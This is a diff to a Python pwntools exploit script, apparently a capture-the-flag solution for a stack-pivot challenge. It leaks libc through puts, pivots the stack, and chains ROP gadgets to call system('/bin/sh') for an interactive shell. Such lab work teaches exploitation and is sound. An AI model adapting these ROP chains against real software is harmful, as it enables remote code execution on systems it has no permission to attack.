@@ -38,6 +38,7 @@ class ROP_Gadget:
     ret = 0x00000000004006b6
     bin_sh = next(libc.search(b"/bin/sh"))
     system = libc.sym["system"]
+    do_system = system - 0x5c0
     sys_exit = libc.sym["exit"]
     zero = 0x0000000000000000
 
@@ -73,14 +74,14 @@ def solve():
         ROP_Gadget.puts_got,
         ROP_Gadget.puts_plt,
         ROP_Gadget.pop_rdi,
-        pivot_addr+100,
+        pivot_addr + 0x60,
         ROP_Gadget.ret,
         ROP_Gadget.pwnme
     ]
 
-    io.sendline(flat(payload_1))
+    io.send(flat(payload_1))
     io.recvuntil(b"smash\n")
-    io.sendline(flat(stager))
+    io.send(flat(stager))
     io.recvuntil(b"Thank you!\n")
 
     recvieved = io.recvline().strip()
@@ -93,9 +94,10 @@ def solve():
 
     io.recvuntil(b"pivot: ")
     pivot_str_2 = io.recvuntil(b"\n")
-    pivot_addr_2 = int(pivot_str_2, 16) + 1000
+    pivot_addr_2 = int(pivot_str_2, 16)
 
-    log.info("Pivot address 2: {}".format(hex(pivot_addr_2)))
+    log.info("TGT pivot address: {}".format(hex(pivot_addr + 0x60)))
+    log.info("Pivot address 2: {}".format(hex(pivot_addr_2 + 1)))
 
     log.info("bin/sh %s " % hex(libc.address + ROP_Gadget.bin_sh))
     log.info("system %s " % hex(libc.address + ROP_Gadget.system))
@@ -103,24 +105,21 @@ def solve():
 
     stager_2 = [
         padding,
-        ROP_Gadget.pop_rdi,
-        libc.address + ROP_Gadget.bin_sh,
-        libc.address + ROP_Gadget.system
+        ROP_Gadget.pop_rax,
+        pivot_addr_2,
+        ROP_Gadget.xchg
     ]
 
     payload_2 = [
         ROP_Gadget.pop_rdi,
-        ROP_Gadget.bin_sh,
-        ROP_Gadget.system,
-        ROP_Gadget.pop_rdi,
-        ROP_Gadget.zero,
-        ROP_Gadget.sys_exit
+        int(hex(libc.address + ROP_Gadget.bin_sh), 16),
+        int(hex(libc.address + ROP_Gadget.do_system), 16),
     ]
 
     log.info(io.recvuntilS(b"> "))
-    io.sendline(flat(payload_2))
+    io.send(flat(payload_2))
     log.info(io.recvuntilS(b"> "))
-    io.sendline(flat(stager_2))
+    io.send(flat(stager_2))
 
     io.interactive()
 
